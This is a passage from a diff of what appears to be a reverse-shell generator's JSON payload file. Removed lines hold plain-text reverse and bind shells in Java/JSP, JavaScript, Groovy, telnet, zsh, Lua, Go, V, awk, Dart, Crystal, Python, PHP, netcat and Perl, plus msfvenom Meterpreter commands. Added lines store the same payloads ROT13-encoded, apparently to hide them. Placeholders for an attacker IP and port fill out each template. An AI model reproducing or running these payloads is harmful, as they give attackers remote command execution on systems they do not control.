pngpu(Rkprcgvba r) \e\a}\e\a%>",
+        "glcr": ["jvaqbjf", "yvahk", "znp"]
       },
       {
-        "name": "Java Two Way",
-        "command": "<%\r\n    \/*\r\n     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.\r\n     * If it cannot connect, an HTML will prompt and you can input commands (sh\/cmd) there and it will prompts the output in the HTML.\r\n     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button \"send\" is clicked, it will try to connect to the reverse shell again (apart from executing \r\n     * the command specified in the HTML form). This is to avoid to keep it simple.\r\n     *\/\r\n%>\r\n\r\n<%@page import=\"java.lang.*\"%>\r\n<%@page import=\"java.io.*\"%>\r\n<%@page import=\"java.net.*\"%>\r\n<%@page import=\"java.util.*\"%>\r\n\r\n<html>\r\n<head>\r\n    <title>jrshell<\/title>\r\n<\/head>\r\n<body>\r\n<form METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">\r\n    <input TYPE=\"text\" NAME=\"shell\">\r\n    <input TYPE=\"submit\" VALUE=\"Send\">\r\n<\/form>\r\n<pre>\r\n<%\r\n    \/\/ Define the OS\r\n    String shellPath = null;\r\n    try\r\n    {\r\n        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\r\n            shellPath = new String(\"\/bin\/sh\");\r\n        } else {\r\n            shellPath = new String(\"cmd.exe\");\r\n        }\r\n    } catch( Exception e ){}\r\n    \/\/ INNER HTML PART\r\n    if (request.getParameter(\"shell\") != null) {\r\n        out.println(\"Command: \" + request.getParameter(\"shell\") + \"\\n<BR>\");\r\n        Process p;\r\n        if (shellPath.equals(\"cmd.exe\"))\r\n            p = Runtime.getRuntime().exec(\"cmd.exe \/c \" + request.getParameter(\"shell\"));\r\n        else\r\n            p = Runtime.getRuntime().exec(\"\/bin\/sh -c \" + request.getParameter(\"shell\"));\r\n        OutputStream os = p.getOutputStream();\r\n        InputStream in = p.getInputStream();\r\n        DataInputStream dis = new DataInputStream(in);\r\n        String disr = dis.readLine();\r\n        while ( disr != null ) {\r\n            out.println(disr);\r\n            disr = dis.readLine();\r\n        }\r\n    }\r\n    \/\/ TCP PORT PART\r\n    class StreamConnector extends Thread\r\n    {\r\n        InputStream wz;\r\n        OutputStream yr;\r\n        StreamConnector( InputStream wz, OutputStream yr ) {\r\n            this.wz = wz;\r\n            this.yr = yr;\r\n        }\r\n        public void run()\r\n        {\r\n            BufferedReader r  = null;\r\n            BufferedWriter w = null;\r\n            try\r\n            {\r\n                r  = new BufferedReader(new InputStreamReader(wz));\r\n                w = new BufferedWriter(new OutputStreamWriter(yr));\r\n                char buffer[] = new char[8192];\r\n                int length;\r\n                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )\r\n                {\r\n                    w.write( buffer, 0, length );\r\n                    w.flush();\r\n                }\r\n            } catch( Exception e ){}\r\n            try\r\n            {\r\n                if( r != null )\r\n                    r.close();\r\n                if( w != null )\r\n                    w.close();\r\n            } catch( Exception e ){}\r\n        }\r\n    }\r\n \r\n    try {\r\n        Socket socket = new Socket( \"{ip}\", {port} ); \/\/ Replace with wanted ip and port\r\n        Process process = Runtime.getRuntime().exec( shellPath );\r\n        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\r\n        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\r\n        out.println(\"port opened on \" + socket);\r\n     } catch( Exception e ) {}\r\n%>\r\n<\/pre>\r\n<\/body>\r\n<\/html>",
-        "type": ["windows", "linux", "mac"]
+        "anzr": "Wnin Gjb Jnl",
+        "pbzznaq": "<%\e\a    \/*\e\a     * Hfntr: Guvf vf n 2 jnl furyy, bar jro furyy naq n erirefr furyy. Svefg, vg jvyy gel gb pbaarpg gb n yvfgrare (ngnpxre znpuvar), jvgu gur VC naq Cbeg fcrpvsvrq ng gur raq bs gur svyr.\e\a     * Vs vg pnaabg pbaarpg, na UGZY jvyy cebzcg naq lbh pna vachg pbzznaqf (fu\/pzq) gurer naq vg jvyy cebzcgf gur bhgchg va gur UGZY.\e\a     * Abgr gung guvf ynfg shapgvbanyvgl vf fybj, fb gur svefg bar (erirefr furyy) vf erpbzzraqrq. Rnpu gvzr gur ohggba \"fraq\" vf pyvpxrq, vg jvyy gel gb pbaarpg gb gur erirefr furyy ntnva (ncneg sebz rkrphgvat \e\a     * gur pbzznaq fcrpvsvrq va gur UGZY sbez). Guvf vf gb nibvq gb xrrc vg fvzcyr.\e\a     *\/\e\a%>\e\a\e\a<%@cntr vzcbeg=\"wnin.ynat.*\"%>\e\a<%@cntr vzcbeg=\"wnin.vb.*\"%>\e\a<%@cntr vzcbeg=\"wnin.arg.*\"%>\e\a<%@cntr vzcbeg=\"wnin.hgvy.*\"%>\e\a\e\a<ugzy>\e\a<urnq>\e\a    <gvgyr>wefuryy<\/gvgyr>\e\a<\/urnq>\e\a<obql>\e\a<sbez ZRGUBQ=\"CBFG\" ANZR=\"zlsbez\" NPGVBA=\"\">\e\a    <vachg GLCR=\"grkg\" ANZR=\"furyy\">\e\a    <vachg GLCR=\"fhozvg\" INYHR=\"Fraq\">\e\a<\/sbez>\e\a<cer>\e\a<%\e\a    \/\/ Qrsvar gur BF\e\a    Fgevat furyyCngu = ahyy;\e\a    gel\e\a    {\e\a        vs (Flfgrz.trgCebcregl(\"bf.anzr\").gbYbjrePnfr().vaqrkBs(\"jvaqbjf\") == -1) {\e\a            furyyCngu = arj Fgevat(\"\/ova\/fu\");\e\a        } ryfr {\e\a            furyyCngu = arj Fgevat(\"pzq.rkr\");\e\a        }\e\a    } pngpu( Rkprcgvba r ){}\e\a    \/\/ VAARE UGZY CNEG\e\a    vs (erdhrfg.trgCnenzrgre(\"furyy\") != ahyy) {\e\a        bhg.cevagya(\"Pbzznaq: \" + erdhrfg.trgCnenzrgre(\"furyy\") + \"\\a<OE>\");\e\a        Cebprff c;\e\a        vs (furyyCngu.rdhnyf(\"pzq.rkr\"))\e\a            c = Ehagvzr.trgEhagvzr().rkrp(\"pzq.rkr \/p \" + erdhrfg.trgCnenzrgre(\"furyy\"));\e\a        ryfr\e\a            c = Ehagvzr.trgEhagvzr().rkrp(\"\/ova\/fu -p \" + erdhrfg.trgCnenzrgre(\"furyy\"));\e\a        BhgchgFgernz bf = c.trgBhgchgFgernz();\e\a        VachgFgernz va = c.trgVachgFgernz();\e\a        QngnVachgFgernz qvf = arj QngnVachgFgernz(va);\e\a        Fgevat qvfe = qvf.ernqYvar();\e\a        juvyr ( qvfe != ahyy ) {\e\a            bhg.cevagya(qvfe);\e\a            qvfe = qvf.ernqYvar();\e\a        }\e\a    }\e\a    \/\/ GPC CBEG CNEG\e\a    pynff FgernzPbaarpgbe rkgraqf Guernq\e\a    {\e\a        VachgFgernz jm;\e\a        BhgchgFgernz le;\e\a        FgernzPbaarpgbe( VachgFgernz jm, BhgchgFgernz le ) {\e\a            guvf.jm = jm;\e\a            guvf.le = le;\e\a        }\e\a        choyvp ibvq eha()\e\a        {\e\a            OhssrerqErnqre e  = ahyy;\e\a            OhssrerqJevgre j = ahyy;\e\a            gel\e\a            {\e\a                e  = arj OhssrerqErnqre(arj VachgFgernzErnqre(jm));\e\a                j = arj OhssrerqJevgre(arj BhgchgFgernzJevgre(le));\e\a                pune ohssre[] = arj pune[8192];\e\a                vag yratgu;\e\a                juvyr( ( yratgu = e.ernq( ohssre, 0, ohssre.yratgu ) ) > 0 )\e\a                {\e\a                    j.jevgr( ohssre, 0, yratgu );\e\a                    j.syhfu();\e\a                }\e\a            } pngpu( Rkprcgvba r ){}\e\a            gel\e\a            {\e\a                vs( e != ahyy )\e\a                    e.pybfr();\e\a                vs( j != ahyy )\e\a                    j.pybfr();\e\a            } pngpu( Rkprcgvba r ){}\e\a        }\e\a    }\e\a \e\a    gel {\e\a        Fbpxrg fbpxrg = arj Fbpxrg( \"{vc}\", {cbeg} ); \/\/ Ercynpr jvgu jnagrq vc naq cbeg\e\a        Cebprff cebprff = Ehagvzr.trgEhagvzr().rkrp( furyyCngu );\e\a        arj FgernzPbaarpgbe(cebprff.trgVachgFgernz(), fbpxrg.trgBhgchgFgernz()).fgneg();\e\a        arj FgernzPbaarpgbe(fbpxrg.trgVachgFgernz(), cebprff.trgBhgchgFgernz()).fgneg();\e\a        bhg.cevagya(\"cbeg bcrarq ba \" + fbpxrg);\e\a     } pngpu( Rkprcgvba r ) {}\e\a%>\e\a<\/cer>\e\a<\/obql>\e\a<\/ugzy>",
+        "glcr": ["jvaqbjf", "yvahk", "znp"]
       },
       {
-        "name": "Javascript",
-        "command":"String command = \"var host = '{ip}';\" +\r\n                       \"var port = {port};\" +\r\n                       \"var cmd = '{shell}';\"+\r\n                       \"var s = new java.net.Socket(host, port);\" +\r\n                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+\r\n                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+\r\n                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+\r\n                       \"print ('Connected');\"+\r\n                       \"while (!s.isClosed()) {\"+\r\n                       \"    while (pi.available() > 0)\"+\r\n                       \"        so.write(pi.read());\"+\r\n                       \"    while (pe.available() > 0)\"+\r\n                       \"        so.write(pe.read());\"+\r\n                       \"    while (si.available() > 0)\"+\r\n                       \"        po.write(si.read());\"+\r\n                       \"    so.flush();\"+\r\n                       \"    po.flush();\"+\r\n                       \"    java.lang.Thread.sleep(50);\"+\r\n                       \"    try {\"+\r\n                       \"        p.exitValue();\"+\r\n                       \"        break;\"+\r\n                       \"    }\"+\r\n                       \"    catch (e) {\"+\r\n                       \"    }\"+\r\n                       \"}\"+\r\n                       \"p.destroy();\"+\r\n                       \"s.close();\";\r\nString x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";\r\nref.add(new StringRefAddr(\"x\", x);",
-        "type":["linux", "mac", "windows"]
+        "anzr": "Wninfpevcg",
+        "pbzznaq":"Fgevat pbzznaq = \"ine ubfg = '{vc}';\" +\e\a                       \"ine cbeg = {cbeg};\" +\e\a                       \"ine pzq = '{furyy}';\"+\e\a                       \"ine f = arj wnin.arg.Fbpxrg(ubfg, cbeg);\" +\e\a                       \"ine c = arj wnin.ynat.CebprffOhvyqre(pzq).erqverpgReebeFgernz(gehr).fgneg();\"+\e\a                       \"ine cv = c.trgVachgFgernz(), cr = c.trgReebeFgernz(), fv = f.trgVachgFgernz();\"+\e\a                       \"ine cb = c.trgBhgchgFgernz(), fb = f.trgBhgchgFgernz();\"+\e\a                       \"cevag ('Pbaarpgrq');\"+\e\a                       \"juvyr (!f.vfPybfrq()) {\"+\e\a                       \"    juvyr (cv.ninvynoyr() > 0)\"+\e\a                       \"        fb.jevgr(cv.ernq());\"+\e\a                       \"    juvyr (cr.ninvynoyr() > 0)\"+\e\a                       \"        fb.jevgr(cr.ernq());\"+\e\a                       \"    juvyr (fv.ninvynoyr() > 0)\"+\e\a                       \"        cb.jevgr(fv.ernq());\"+\e\a                       \"    fb.syhfu();\"+\e\a                       \"    cb.syhfu();\"+\e\a                       \"    wnin.ynat.Guernq.fyrrc(50);\"+\e\a                       \"    gel {\"+\e\a                       \"        c.rkvgInyhr();\"+\e\a                       \"        oernx;\"+\e\a                       \"    }\"+\e\a                       \"    pngpu (r) {\"+\e\a                       \"    }\"+\e\a                       \"}\"+\e\a                       \"c.qrfgebl();\"+\e\a                       \"f.pybfr();\";\e\aFgevat k = \"\\\"\\\".trgPynff().sbeAnzr(\\\"wnink.fpevcg.FpevcgRatvarZnantre\\\").arjVafgnapr().trgRatvarOlAnzr(\\\"WninFpevcg\\\").riny(\\\"\"+pbzznaq+\"\\\")\";\e\aers.nqq(arj FgevatErsNqqe(\"k\", k);",
+        "glcr":["yvahk", "znp", "jvaqbjf"]
       },
       {
-        "name": "Groovy",
-        "command":"String host=\"{ip}\";int port={port};String cmd=\"{shell}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
-        "type":["windows"]
+        "anzr": "Tebbil",
+        "pbzznaq":"Fgevat ubfg=\"{vc}\";vag cbeg={cbeg};Fgevat pzq=\"{furyy}\";Cebprff c=arj CebprffOhvyqre(pzq).erqverpgReebeFgernz(gehr).fgneg();Fbpxrg f=arj Fbpxrg(ubfg,cbeg);VachgFgernz cv=c.trgVachgFgernz(),cr=c.trgReebeFgernz(), fv=f.trgVachgFgernz();BhgchgFgernz cb=c.trgBhgchgFgernz(),fb=f.trgBhgchgFgernz();juvyr(!f.vfPybfrq()){juvyr(cv.ninvynoyr()>0)fb.jevgr(cv.ernq());juvyr(cr.ninvynoyr()>0)fb.jevgr(cr.ernq());juvyr(fv.ninvynoyr()>0)cb.jevgr(fv.ernq());fb.syhfu();cb.syhfu();Guernq.fyrrc(50);gel {c.rkvgInyhr();oernx;}pngpu (Rkprcgvba r){}};c.qrfgebl();f.pybfr();",
+        "glcr":["jvaqbjf"]
       },
       {
-        "name": "telnet",
-        "command": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",
-        "type": ["linux", "mac"]
+        "anzr": "gryarg",
+        "pbzznaq": "GS=$(zxgrzc -h);zxsvsb $GS && gryarg {vc} {cbeg} 0<$GS | {furyy} 1>$GS",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "zsh",
-        "command": "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
-        "type": ["linux", "mac"]
+        "anzr": "mfu",
+        "pbzznaq": "mfu -p 'mzbqybnq mfu/arg/gpc && mgpc {vc} {cbeg} && mfu >&$ERCYL 2>&$ERCYL 0>&$ERCYL'",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Lua #1",
-        "command": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"",
-        "type": ["linux"]
+        "anzr": "Yhn #1",
+        "pbzznaq": "yhn -r \"erdhver('fbpxrg');erdhver('bf');g=fbpxrg.gpc();g:pbaarpg('{vc}','{cbeg}');bf.rkrphgr('{furyy} -v <&3 >&3 2>&3');\"",
+        "glcr": ["yvahk"]
       },
       {
-        "name": "Lua #2",
-        "command": "lua5.1 -e 'local host, port = \"{ip}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
-        "type": ["linux", "windows"]
+        "anzr": "Yhn #2",
+        "pbzznaq": "yhn5.1 -r 'ybpny ubfg, cbeg = \"{vc}\", {cbeg} ybpny fbpxrg = erdhver(\"fbpxrg\") ybpny gpc = fbpxrg.gpc() ybpny vb = erdhver(\"vb\") gpc:pbaarpg(ubfg, cbeg); juvyr gehr qb ybpny pzq, fgnghf, cnegvny = gpc:erprvir() ybpny s = vb.cbcra(pzq, \"e\") ybpny f = s:ernq(\"*n\") s:pybfr() gpc:fraq(f) vs fgnghf == \"pybfrq\" gura oernx raq raq gpc:pybfr()'",
+        "glcr": ["yvahk", "jvaqbjf"]
       },
       {
-        "name": "Golang",
-        "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
-        "type": ["linux", "mac", "windows"]
+        "anzr": "Tbynat",
+        "pbzznaq": "rpub 'cnpxntr znva;vzcbeg\"bf/rkrp\";vzcbeg\"arg\";shap znva(){p,_:=arg.Qvny(\"gpc\",\"{vc}:{cbeg}\");pzq:=rkrp.Pbzznaq(\"{furyy}\");pzq.Fgqva=p;pzq.Fgqbhg=p;pzq.Fgqree=p;pzq.Eha()}' > /gzc/g.tb && tb eha /gzc/g.tb && ez /gzc/g.tb",
+        "glcr": ["yvahk", "znp", "jvaqbjf"]
       },
       {
-        "name": "Vlang",
-        "command": "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e {shell} {ip} {port} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
-        "type": ["linux", "mac"]
+        "anzr": "Iynat",
+        "pbzznaq": "rpub 'vzcbeg bf' > /gzc/g.i && rpub 'sa znva() { bf.flfgrz(\"ap -r {furyy} {vc} {cbeg} 0>&1\") }' >> /gzc/g.i && i eha /gzc/g.i && ez /gzc/g.i",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Awk",
-        "command": "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
-        "type": ["linux", "mac"]
+        "anzr": "Njx",
+        "pbzznaq": "njx 'ORTVA {f = \"/varg/gpc/0/{vc}/{cbeg}\"; juvyr(42) { qb{ cevags \"furyy>\" |& f; f |& trgyvar p; vs(p){ juvyr ((p |& trgyvar) > 0) cevag $0 |& f; pybfr(p); } } juvyr(p != \"rkvg\") pybfr(f); }}' /qri/ahyy",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Dart",
-        "command": "import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"{ip}\", {port}).then((socket) {\n    socket.listen((data) {\n      Process.start('{shell}', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}",
-        "type": ["linux", "mac", "windows"]
+        "anzr": "Qneg",
+        "pbzznaq": "vzcbeg 'qneg:vb';\avzcbeg 'qneg:pbaireg';\a\aznva() {\a  Fbpxrg.pbaarpg(\"{vc}\", {cbeg}).gura((fbpxrg) {\a    fbpxrg.yvfgra((qngn) {\a      Cebprff.fgneg('{furyy}', []).gura((Cebprff cebprff) {\a        cebprff.fgqva.jevgrya(arj Fgevat.sebzPunePbqrf(qngn).gevz());\a        cebprff.fgqbhg\a          .genafsbez(hgs8.qrpbqre)\a          .yvfgra((bhgchg) { fbpxrg.jevgr(bhgchg); });\a      });\a    },\a    baQbar: () {\a      fbpxrg.qrfgebl();\a    });\a  });\a}",
+        "glcr": ["yvahk", "znp", "jvaqbjf"]
       },
       {
-        "name": "Crystal (system)",
-        "command": "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{ip}\",{port});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'",
-        "type": ["linux", "windows", "mac"]
+        "anzr": "Pelfgny (flfgrz)",
+        "pbzznaq": "pelfgny riny 'erdhver \"cebprff\";erdhver \"fbpxrg\";p=Fbpxrg.gpc(Fbpxrg::Snzvyl::VARG);p.pbaarpg(\"{vc}\",{cbeg});ybbc{z,y=p.erprvir;c=Cebprff.arj(z.efgevc(\"\\a\"),bhgchg:Cebprff::Erqverpg::Cvcr,furyy:gehr);p<<c.bhgchg.trgf_gb_raq}'",
+        "glcr": ["yvahk", "jvaqbjf", "znp"]
       },
       {
-        "name": "Crystal (code)",
-        "command": "require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{ip}\", {port})\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend",
-        "type": ["linux", "mac"]
+        "anzr": "Pelfgny (pbqr)",
+        "pbzznaq": "erdhver \"cebprff\"\aerdhver \"fbpxrg\"\a\ap = Fbpxrg.gpc(Fbpxrg::Snzvyl::VARG)\ap.pbaarpg(\"{vc}\", {cbeg})\aybbc qb \a  z, y = p.erprvir\a  c = Cebprff.arj(z.efgevc(\"\\a\"), bhgchg:Cebprff::Erqverpg::Cvcr, furyy:gehr)\a  p << c.bhgchg.trgf_gb_raq\araq",
+        "glcr": ["yvahk", "znp"]
       }
     ],
-    "BindShell": [
+    "OvaqFuryy": [
       {
-        "name": "Python3 Bind",
-        "command": "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'",
-        "type":["mac", "linux", "windows"]
+        "anzr": "Clguba3 Ovaq",
+        "pbzznaq": "clguba3 -p 'rkrp(\"\"\"vzcbeg fbpxrg nf f,fhocebprff nf fc;f1=f.fbpxrg(f.NS_VARG,f.FBPX_FGERNZ);f1.frgfbpxbcg(f.FBY_FBPXRG,f.FB_ERHFRNQQE, 1);f1.ovaq((\"0.0.0.0\",{cbeg}));f1.yvfgra(1);p,n=f1.npprcg();\ajuvyr Gehr: q=p.erpi(1024).qrpbqr();c=fc.Cbcra(q,furyy=Gehr,fgqbhg=fc.CVCR,fgqree=fc.CVCR,fgqva=fc.CVCR);p.fraqnyy(c.fgqbhg.ernq()+c.fgqree.ernq())\"\"\")'",
+        "glcr":["znp", "yvahk", "jvaqbjf"]
       },
       {
-        "name": "PHP Bind",
-        "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'",
-        "type":["mac", "linux", "windows"]
+        "anzr": "CUC Ovaq",
+        "pbzznaq": "cuc -e '$f=fbpxrg_perngr(NS_VARG,FBPX_FGERNZ,FBY_GPC);fbpxrg_ovaq($f,\"0.0.0.0\",{cbeg});fbpxrg_yvfgra($f,1);$py=fbpxrg_npprcg($f);juvyr(1){vs(!fbpxrg_jevgr($py,\"$ \",2))rkvg;$va=fbpxrg_ernq($py,100);$pzq=cbcra(\"$va\",\"e\");juvyr(!srbs($pzq)){$z=strgp($pzq);fbpxrg_jevgr($py,$z,fgeyra($z));}}'",
+        "glcr":["znp", "yvahk", "jvaqbjf"]
       },
       {
-        "name": "nc Bind",
-        "command": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f",
-        "type":["mac", "linux"]
+        "anzr": "ap Ovaq",
+        "pbzznaq": "ez -s /gzc/s; zxsvsb /gzc/s; png /gzc/s | /ova/fu -v 2>&1 | ap -y 0.0.0.0 {cbeg} > /gzc/s",
+        "glcr":["znp", "yvahk"]
       },
       {
-        "name": "Perl Bind",
-        "command": "perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'",
-        "type":["mac", "linux"]
+        "anzr": "Crey Ovaq",
+        "pbzznaq": "crey -r 'hfr Fbpxrg;$c={cbeg};fbpxrg(F,CS_VARG,FBPX_FGERNZ,trgcebgbolanzr(\"gpc\"));ovaq(F,fbpxnqqe_va($c, VANQQE_NAL));yvfgra(F,FBZNKPBAA);sbe(;$c=npprcg(P,F);pybfr P){bcra(FGQVA,\">&P\");bcra(FGQBHG,\">&P\");bcra(FGQREE,\">&P\");rkrp(\"/ova/fu -v\");};'",
+        "glcr":["znp", "yvahk"]
       }
     ],
-    "MSFVenom": [
+    "ZFSIrabz": [
       {
-        "name": "Windows Meterpreter Staged Reverse TCP (x64)",
-        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
-        "type":["windows"]
+        "anzr": "Jvaqbjf Zrgrecergre Fgntrq Erirefr GPC (k64)",
+        "pbzznaq": "zfsirabz -c jvaqbjf/k64/zrgrecergre/erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s rkr -b erirefr.rkr",
+        "glcr":["jvaqbjf"]
       },
       {
-        "name": "Windows Meterpreter Stageless Reverse TCP (x64)",
-        "command": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
-        "type":["windows"]
+        "anzr": "Jvaqbjf Zrgrecergre Fgntryrff Erirefr GPC (k64)",
+        "pbzznaq": "zfsirabz -c jvaqbjf/k64/zrgrecergre_erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s rkr -b erirefr.rkr",
+        "glcr":["jvaqbjf"]
       },
       {
-        "name": "Windows Staged Reverse TCP (x64)",
-        "command": "msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
-        "type":["windows"]
+        "anzr": "Jvaqbjf Fgntrq Erirefr GPC (k64)",
+        "pbzznaq": "zfsirabz -c jvaqbjf/k64/furyy/erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s rkr -b erirefr.rkr",
+        "glcr":["jvaqbjf"]
       },
       {
-        "name": "Windows Stageless Reverse TCP (x64)",
-        "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
-        "type":["windows"]
+        "anzr": "Jvaqbjf Fgntryrff Erirefr GPC (k64)",
+        "pbzznaq": "zfsirabz -c jvaqbjf/k64/furyy_erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s rkr -b erirefr.rkr",
+        "glcr":["jvaqbjf"]
       },
       {
-        "name": "Windows Staged JSP Reverse TCP",
-        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp",
-        "type":["windows"]
+        "anzr": "Jvaqbjf Fgntrq WFC Erirefr GPC",
+        "pbzznaq": "zfsirabz -c jvaqbjf/k64/zrgrecergre/erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s wfc -b ./eri.wfc",
+        "glcr":["jvaqbjf"]
       },
       {
-        "name": "Windows Staged ASPX Reverse TCP",
-        "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
-        "type":["windows"]
+        "anzr": "Jvaqbjf Fgntrq NFCK Erirefr GPC",
+        "pbzznaq": "zfsirabz -c jvaqbjf/zrgrecergre/erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s nfck -b erirefr.nfck",
+        "glcr":["jvaqbjf"]
       },
       {
-        "name": "Windows Staged ASPX Reverse TCP (x64)",
-        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
-        "type":["windows"]
+        "anzr": "Jvaqbjf Fgntrq NFCK Erirefr GPC (k64)",
+        "pbzznaq": "zfsirabz -c jvaqbjf/k64/zrgrecergre/erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s nfck -b erirefr.nfck",
+        "glcr":["jvaqbjf"]
       },
       {
-        "name": "Linux Meterpreter Staged Reverse TCP (x64)",
-        "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
-        "type":["linux"]
+        "anzr": "Yvahk Zrgrecergre Fgntrq Erirefr GPC (k64)",
+        "pbzznaq": "zfsirabz -c yvahk/k64/zrgrecergre/erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s rys -b erirefr.rys",
+        "glcr":["yvahk"]
       },
       {
-        "name": "Linux Stageless Reverse TCP (x64)",
-        "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
-        "type":["linux"]
+        "anzr": "Yvahk Fgntryrff Erirefr GPC (k64)",
+        "pbzznaq": "zfsirabz -c yvahk/k64/furyy_erirefr_gpc YUBFG={vc} YCBEG={cbeg} -s rys -b erirefr.rys",
+        "glcr":["yvahk"]
       },
       {
-        "name": "Windows Bind TCP ShellCode - BOF",
-        "command": "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\\x00' -f python -v notBuf -o shellcode",
-        "type":["windows"]
+        "anzr": "Jvaqbjf Ovaq GPC FuryyPbqr - OBS",
+        "pbzznaq": "zfsirabz -n k86 --cyngsbez Jvaqbjf -c jvaqbjf/furyy/ovaq_gpc -r k86/fuvxngn_tn_anv -o '\\k00' -s clguba -i abgOhs -b furyypbqr",
+        "glcr":["jvaqbjf"]
       },
       {
-        "name": "macOS Meterpreter Staged Reverse TCP (x64)",
-        "command": "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
-        "type":["mac"]
